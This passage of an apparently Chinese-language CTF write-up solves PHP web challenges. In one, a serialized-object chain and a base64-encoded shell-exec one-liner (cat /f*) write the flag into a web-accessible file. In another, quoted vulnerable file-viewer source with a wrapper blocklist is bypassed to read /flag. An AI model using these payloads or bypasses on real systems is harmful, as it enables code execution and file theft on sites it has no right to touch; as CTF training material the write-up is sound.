+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$stu</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#8839EF;--shiki-dark:#7FDBCA"> new</span><span style="--shiki-light:#DF8E1D;--shiki-light-font-style:italic;--shiki-dark:#FFCB8B;--shiki-dark-font-style:inherit"> STU</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">();</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$ctf</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#8839EF;--shiki-dark:#7FDBCA"> new</span><span style="--shiki-light:#DF8E1D;--shiki-light-font-style:italic;--shiki-dark:#FFCB8B;--shiki-dark-font-style:inherit"> CTF</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">();</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$sdu</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">Dazhuan</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $stu</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$stu</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">stu</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $ctf</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">echo</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> serialize</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">sdu</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span></code></pre>
+<p><code>PD89YGNhdCAvZipgOw==</code>可以绕过过滤，实则他就是</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">&#x3C;?</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">=</span><span style="--shiki-light:#179299;--shiki-dark:#ECC48D">`</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">cat</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /f</span><span style="--shiki-light:#4C4F69;--shiki-dark:#7FDBCA">*</span><span style="--shiki-light:#179299;--shiki-dark:#ECC48D">`</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span></code></pre>
+<p>最终会把flag导出到网站目录的<code>aaaa.php</code>中直接访问可以拿到flag
+<img src="https://static.synex.space/article/Pasted%20image%2020250118172011.png" alt="">
+即<code>flag{f44ab7d7195a1f156aa2fbc1ceba61ec}</code></p>
+<h2 id="第3天-easy_php">第3天 easy_php</h2>
+<p>打开之后可以直接下载源码，源码中的file.php中内容如下</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="php"><code><span class="line"><span style="--shiki-light:#179299;--shiki-dark:#C792EA">&#x3C;?</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">php</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">header</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">content-type:text/html;charset=utf-8</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">include</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">function.php</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">include</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">class.php</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">#ini_set('open_basedir','/var/www/html/phar2');</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$file</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> $_GET</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">file</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> ?</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> $_GET</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">file</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> :</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> ""</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">empty</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">    echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">&#x3C;h2>There is no file to show!&#x3C;h2/></span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$show</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#8839EF;--shiki-dark:#7FDBCA"> new</span><span style="--shiki-light:#DF8E1D;--shiki-light-font-style:italic;--shiki-dark:#FFCB8B;--shiki-dark-font-style:inherit"> Show</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">();</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">file_exists</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">    $show</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">source</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">    $show</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">_show</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">();</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> else</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">!</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">empty</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)){</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    die</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">file doesn</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">\'</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">t exists.</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"><span style="--shiki-light:#179299;--shiki-dark:#C792EA">?></span></span></code></pre>
+<p>在SHOW()这个类中，内容如下</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="php"><code><span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">class</span><span style="--shiki-light:#DF8E1D;--shiki-light-font-style:italic;--shiki-dark:#FFCB8B;--shiki-dark-font-style:inherit"> Show</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">{</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $source</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $str</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA"> function</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> __construct</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#E64553;--shiki-dark:#BEC5D4">$</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#BEC5D4;--shiki-dark-font-style:inherit">file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">)</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    {</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-dark:#7FDBCA">        $this</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">source</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">        echo</span><span style="--shiki-light:#D20F39;--shiki-dark:#7FDBCA"> $this</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">source</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    }</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA"> function</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> __toString</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">()</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    {</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">        $content</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#D20F39;--shiki-dark:#7FDBCA"> $this</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">str</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">str</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">source</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        return</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $content</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    }</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA"> function</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> __set</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#E64553;--shiki-dark:#BEC5D4">$</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#BEC5D4;--shiki-dark-font-style:inherit">key</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#E64553;--shiki-dark:#BEC5D4">$</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#BEC5D4;--shiki-dark-font-style:inherit">value</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">)</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    {</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-dark:#7FDBCA">        $this</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$key</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $value</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    }</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA"> function</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> _show</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">()</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    {</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">preg_match</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#EA76CB;--shiki-dark:#D9F5DD">'/</span><span style="--shiki-light:#40A02B;--shiki-dark:#5CA7E4">http|https|file:|gopher|dict|</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">\.\.</span><span style="--shiki-light:#40A02B;--shiki-dark:#5CA7E4">|f1ag</span><span style="--shiki-light:#EA76CB;--shiki-dark:#D9F5DD">/i'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#D20F39;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#D20F39;--shiki-dark:#7FDBCA">this</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">source</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">            die</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">hacker!</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">        }</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> else</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">            highlight_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#D20F39;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#D20F39;--shiki-dark:#7FDBCA">this</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">source</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">        }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    }</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA"> function</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> __wakeup</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">()</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    {</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">preg_match</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#EA76CB;--shiki-dark:#D9F5DD">"/</span><span style="--shiki-light:#40A02B;--shiki-dark:#5CA7E4">http|https|file:|gopher|dict|</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">\.\.</span><span style="--shiki-light:#EA76CB;--shiki-dark:#D9F5DD">/i"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#D20F39;--shiki-dark:#D6DEEB"> $</span><span style="--shiki-light:#D20F39;--shiki-dark:#7FDBCA">this</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">source</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">            echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">hacker~</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-dark:#7FDBCA">            $this</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-></span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">source</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">index.php</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">        }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span></code></pre>
+<p>当设置好<code>source</code>之后去_show的时候<code>/http|https|file:|gopher|dict|\.\.|f1ag/i</code>只要不是这些就会直接显示，即构造payload为GET<code>/file.php?file=/flag</code>即拿到flag
+<img src="https://static.synex.space/article/Pasted%20image%2020250119125312.png" alt="">
+<code>flag{a16dcb7549915546893a27a6d7927615}</code></p>
+<h2 id="第3天-easy_code">第3天 easy_code</h2>
+<p>这道题也是后续整理的，网站中有个robots.txt访问后会发现有个gogogo.php，访问之后主要是这里，并且题目也提示了需要溢出，之后通过filter去读取read.php</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="php"><code><span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$ctfer</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> ===</span><span style="--shiki-light:#8839EF;--shiki-dark:#82AAFF"> null</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    die</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">error 0!</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">!</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">is_numeric</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">ctfer</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    die</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">error 1!</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$ctfer</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">!=</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 667</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
